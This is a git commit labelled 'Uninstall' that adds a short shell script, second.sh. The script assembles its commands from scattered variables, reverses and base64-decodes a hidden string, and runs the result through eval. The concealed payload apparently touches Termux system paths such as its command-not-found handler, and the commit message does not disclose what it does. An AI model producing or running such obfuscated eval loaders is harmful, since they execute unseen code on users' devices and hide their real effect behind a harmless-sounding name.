2d234ef7aec468650ed6bf798139108298b132e2
mnur9868 <32473994+mnur9868@users.noreply.github.com>
2019-05-23 23:47:11 +0700

    Uninstall

---
+++ second.sh
@@ -0,0 +1,4 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=0nCpZmCARCIk5WdvZWL09mbtQmbh1WbvN2L4VXbyVGdvMWZ4VmYpx2LyNXdvMXZslmZvgXdtJXZ05SbvN2LhRXYk9SY0FGZvoQZzxWZKg2chJmCuVGa0pQKd1FIng2chJ0Jg0DIARCIbtFI8xHId1FInIXY1xWZLdCI9ACQkAyWbBCf8BSXdByJyFWdsV2anASPgAEJgs1WoAiZppgC7lCKlxGZuFGafRmb19mZfR3bu9FZuFWbt92Y
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
